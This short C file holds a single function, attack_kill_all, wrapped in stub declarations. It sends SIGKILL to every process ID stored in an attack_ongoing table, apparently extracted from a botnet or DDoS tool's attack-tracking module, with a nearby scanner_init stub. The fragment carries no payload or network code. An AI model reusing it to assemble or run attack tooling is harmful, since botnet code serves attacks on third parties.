
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int ATTACK_CONCURRENT_MAX ;
 scalar_t__* attack_ongoing ;
 int kill (scalar_t__,int) ;
 int printf (char*) ;
 int scanner_init () ;

void attack_kill_all(void)
{
    int i;





    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
            kill(attack_ongoing[i], 9);
        attack_ongoing[i] = 0;
    }




}
